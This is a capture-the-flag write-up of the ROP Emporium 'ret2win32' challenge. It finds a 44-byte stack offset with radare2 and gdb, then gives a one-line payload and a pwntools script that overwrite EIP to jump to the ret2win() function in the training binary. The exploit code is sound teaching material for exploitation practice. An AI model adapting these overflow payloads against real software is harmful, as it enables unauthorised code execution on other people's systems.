---
layout: post
title: "Ret2win32"
author: "Trojan187"
categories: ctf
tags: [documentation,sample]
image: ctf.PNG
---


## Table of Contents

1. [Introduction](#introduction)
2. [Analysis](#analysis)
3. [Plan](#plan)
4. [Solution](#solution)


##  Introduction

The challenge provides us with the binary.

HINT from: [!https://ropemporium.com/challenge/ret2win.html](https://ropemporium.com/challenge/ret2win.html)
As it states; you'll feed each binary with a quantity of garbage followed by your ROP chain. In this case there is a magic method we want to call and we'll do so by overwriting a saved return address on the stack. Certainly nothing that could be called a 'chain' by any stretch of the imagination but we've got to start somewhere. We'll do a little RE to confirm some information but nothing serious

---
### ROP-Emporium: ret2win32

_Files:_ `ret2win32`

---

##  Analysis

Lets take a look at the properties of the binary.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win/checksec.PNG">

Using radare2 to analyze all referenced code.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win/r2_aaaa.PNG">

Print the disassembly of the ret2win() function.
NOTE* `0x08048662` This looks very interesting and a potential address that can be used if the registers can be controlled. 

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win/r2_pdf_ret2win.PNG">

Creating a pattern of 100 characters to use to locate the segmentation fault

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win/gdb_start_pattern_create.PNG">

Segmentation fault occured and EIP was overwritten by 'AFAA' `0x41414641`. The offset is located at 44 bytes. 
EIP can now be controlled.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win/gdb_EIP_Seg_fault.PNG">

##  Plan

The hint said there will not be chaining required, hmmm the solution may just be that simple. So I thought I would just input the address I noted `0x08048662` when disassembling the ret2win() function im `Image#3` above. 


```python

run <<< $(python -c 'print "A"*44 + "\x62\x86\x04\x08"')
```
Nice! It worked. 

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win/gdb_flag.PNG">

And this is my final python script to exploit it.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win/flag.PNG">

##  Solution

```python

#!/usr/bin/python
from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './ret2win32'
e = ELF(binary_path)
p = process(binary_path)

buf = "A" * 44
buf += p32(0x08048662)

print(p.recvuntil('!\n'))
p.sendline(buf)
p.interactive()



```



## END
---

